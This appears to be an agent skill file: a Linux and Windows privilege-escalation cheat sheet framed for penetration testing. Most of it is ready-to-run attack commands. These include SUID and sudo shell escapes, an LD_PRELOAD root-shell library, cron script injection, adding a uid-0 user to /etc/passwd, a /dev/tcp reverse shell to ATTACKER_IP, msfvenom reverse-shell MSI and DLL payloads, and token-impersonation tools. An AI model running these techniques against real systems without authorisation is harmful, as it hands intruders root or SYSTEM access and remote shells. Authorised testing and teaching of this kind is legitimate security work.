---
name: privilege_escalation
description: Linux and Windows privilege escalation - SUID, sudo misconfig, cron, writable paths, token impersonation, DLL hijacking, kernel exploits
---

# Privilege Escalation

Privilege escalation moves from a low-privilege shell to root/SYSTEM by exploiting misconfigurations, weak permissions, unpatched kernel vulnerabilities, or service account abuse. Always enumerate broadly before attempting exploits — most privesc comes from misconfigurations, not kernel exploits.

## Linux Privilege Escalation

### Initial Enumeration

```bash
# Automated — run linpeas and review output
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash

# Manual checklist
whoami; id; hostname; uname -a; cat /etc/os-release
sudo -l                                    # sudo privileges — key check
find / -perm -4000 -type f 2>/dev/null   # SUID binaries
find / -perm -2000 -type f 2>/dev/null   # SGID binaries
crontab -l; cat /etc/crontab; ls -la /etc/cron.*   # cron jobs
cat /etc/passwd | grep -v nologin         # users with shell
ss -tlnp; netstat -tlnp 2>/dev/null       # open ports
env; cat ~/.bashrc ~/.bash_profile 2>/dev/null   # environment vars
find / -writable -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null   # writable files
cat /etc/sudoers 2>/dev/null
ls -la /home /tmp /var/www /opt
```

### SUID/SGID Exploitation

```bash
# Find SUID → check GTFOBins
find / -perm -4000 2>/dev/null | xargs ls -la

# Common exploitable SUIDs:
/usr/bin/find:     find . -exec /bin/bash -p \; -quit
/usr/bin/vim:      vim -c ':!bash'
/usr/bin/python3:  python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
/usr/bin/nmap:     echo "os.execute('/bin/bash')" > /tmp/nmap.nse; nmap --script=/tmp/nmap.nse
/usr/bin/cp:       cp /etc/passwd /tmp/; # modify; copy back
/usr/bin/bash:     bash -p            # Drop to privesc shell if bash itself has SUID
/usr/bin/less:     less /etc/shadow; !bash
/usr/bin/man:      man man; !/bin/bash
```

### Sudo Misconfigurations

```bash
sudo -l    # check what can be run as root

# Exploitable sudo entries (GTFOBins reference):
(ALL) NOPASSWD: /usr/bin/find    → sudo find . -exec /bin/bash \; -quit
(ALL) NOPASSWD: /usr/bin/python3 → sudo python3 -c 'import os; os.system("/bin/bash")'
(ALL) NOPASSWD: /usr/bin/less    → sudo less /etc/shadow → !/bin/bash
(ALL) NOPASSWD: /usr/bin/vim     → sudo vim -c ':!bash'
(root) /usr/bin/service *        → sudo service ../../../../bin/bash

# LD_PRELOAD (if env_keep += LD_PRELOAD in sudoers)
cat > /tmp/priv.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() { unsetenv("LD_PRELOAD"); setuid(0); setgid(0); system("/bin/bash"); }
EOF
gcc -fPIC -shared -o /tmp/priv.so /tmp/priv.c -nostartfiles
sudo LD_PRELOAD=/tmp/priv.so any_allowed_command
```

### Cron Job Exploitation

```bash
# If cron runs a writable script as root:
ls -la /path/to/cronjob.sh
echo 'chmod +s /bin/bash' >> /path/to/cronjob.sh
# Wait for cron → /bin/bash -p → root

# Path injection (if PATH in crontab is world-writable dir first):
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /tmp/vulnerable_command
chmod +x /tmp/vulnerable_command
# Cron must call the command without full path
```

### Writable /etc/passwd

```bash
# Add a root-level user
openssl passwd -1 attackerpass    # generates $1$...$... hash
echo 'hacker:HASH_HERE:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker   # password: attackerpass
```

### Capabilities Exploitation

```bash
# Check capabilities
getcap -r / 2>/dev/null

# Exploitable capabilities:
cap_setuid        → python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
cap_net_raw       → packet capture, ARP spoofing
cap_sys_admin     → mount, namespace operations
cap_dac_read_search → read any file (shadow, private keys)

# Example: Python with cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Kernel Exploits

```bash
uname -a     # kernel version
cat /etc/os-release

# Look up kernel version on exploit-db:
searchsploit linux kernel 5.4 privilege escalation

# Common recent exploits (check version applicability):
# DirtyPipe: Linux 5.8+ (CVE-2022-0847) — write to read-only files
# DirtyCOW: Linux < 4.8.3 (CVE-2016-5195)
# GameOver(lay): Ubuntu OverlayFS privesc (CVE-2023-2640)
python3 dirtypipe.py /usr/bin/su    # modifies su SUID
```

## Windows Privilege Escalation

### Initial Enumeration

```powershell
# Automated
.\winPEAS.exe

# Manual
whoami /all
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
net user; net localgroup administrators
netstat -ano
tasklist /svc
wmic service get Name,PathName,StartMode | findstr /i "auto"
reg query HKLM\SYSTEM\CurrentControlSet\Services /v ImagePath
icacls "C:\Program Files" /T | findstr "Everyone\|BUILTIN\Users"
wmic qfe list brief       # patches installed
```

### Token Impersonation (SeImpersonatePrivilege)

```
# Check: whoami /priv → SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege

# Tools:
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c {CLSID}
PrintSpoofer.exe -i -c cmd    # requires PrintSpooler service running
RoguePotato.exe -r ATTACKER_IP -e "cmd.exe"
GodPotato.exe -cmd "cmd /c whoami > C:\output.txt"
```

### AlwaysInstallElevated

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both must be 1

msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi -o malicious.msi
msiexec /quiet /qn /i malicious.msi
```

### DLL Hijacking / Side-Loading

```powershell
# Find services running as SYSTEM with unquoted paths or writable directories
wmic service get Name,PathName,StartMode | findstr /v "C:\Windows"
icacls "C:\Program Files\Vulnerable App" | findstr "BUILTIN\Users.*F\|Everyone.*F"

# Create malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f dll -o version.dll
# Place in directory searched before the legitimate DLL location
```

### Service Binary Hijacking

```powershell
# Find writable service binary
sc qc VulnerableService    # check Binary Path
icacls "C:\path\to\service.exe"
# If writable:
copy malicious.exe "C:\path\to\service.exe"
net start VulnerableService
```

### Scheduled Tasks

```powershell
schtasks /query /fo LIST /v | findstr /i "task name\|run as\|program"
# Look for tasks running as SYSTEM with writable script/binary
icacls "C:\Tasks\vuln_script.ps1"
```

## pspy (Process Monitoring Without Root)

```bash
# Watch for cron jobs and privileged processes
./pspy64
# Look for: UID=0 + command running writable script
```

## Validation Approach

1. Run linpeas/winPEAS first — flag all HIGH-severity findings
2. Manually verify top findings before exploiting
3. Exploit → demonstrate root/SYSTEM via `id` or `whoami /all`
4. Document full chain: initial access → vulnerability found → exploit command → resulting shell
5. For reporting: include pre-exploit permission listing AND post-exploit privilege proof

## Tools

- `linpeas.sh` / `winPEAS.exe` — automated enumeration
- `pspy64` — unprivileged process monitoring (Linux)
- `GTFOBins.github.io` — SUID/sudo exploitation reference
- `JuicyPotato`, `PrintSpoofer`, `GodPotato` — Windows token impersonation
- `impacket` — network-based elevation
